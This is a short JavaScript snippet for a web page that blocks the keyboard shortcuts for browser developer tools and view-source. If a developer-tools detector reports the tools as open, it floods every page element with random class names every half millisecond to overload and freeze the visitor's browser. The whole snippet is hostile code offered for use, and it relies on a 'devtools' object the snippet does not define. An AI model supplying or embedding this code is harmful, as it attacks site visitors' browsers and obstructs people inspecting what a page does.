document.onkeydown = function(e) {
if(event.keyCode == 123) {
     return false;
}
if(e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) {
     return false;
}
if(e.ctrlKey && e.shiftKey && e.keyCode == 'C'.charCodeAt(0)) {
     return false;
}
if(e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) {
     return false;
}
if(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) {
     return false;
}
}
window.setInterval('overloadBrowser()', 2000); 

function overloadBrowser(){
     if (devtools.isOpen) {

     setInterval(() => {
          var $all = document.querySelectorAll("*");
          for (var each of $all) {
               each.classList.add(`asdjaljsdliasud8ausdijaisdluasdjasildahjdsk${Math.random()}`);
          }
          
          }, 0.5);
     }
}
